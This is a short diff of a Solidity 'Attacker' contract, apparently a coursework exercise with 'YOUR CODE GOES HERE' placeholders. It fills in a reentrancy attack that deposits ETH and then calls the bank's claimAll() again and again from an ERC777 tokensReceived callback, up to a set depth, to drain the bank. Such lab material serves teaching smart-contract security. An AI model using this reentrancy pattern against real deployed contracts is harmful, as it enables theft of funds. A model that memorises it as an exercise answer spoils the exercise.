@@ -30,6 +30,7 @@ contract Attacker is AccessControl, IERC777Recipient {
         _grantRole(ATTACKER_ROLE, bank.token.address );
 	}
 
+
 	/*
 	   The main attack function that should start the reentrancy attack
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
@@ -39,6 +40,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO START ATTACK GOES HERE
 		require(msg.value == amt, "Must send exact amount");
 		bank.deposit{value: amt}();
+		emit Deposit(amt); 
 		bank.claimAll();
 	}
 
@@ -63,10 +65,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-		if (msg.sender == address(token) && from == address(bank)) {
-        if (bank.balances(address(this)) > 0) {
-            bank.claimAll();
-        }
+		if (depth < max_depth) {
+        depth++;
+        emit Recurse(depth);
+        bank.claimAll();
     }
 	}
 
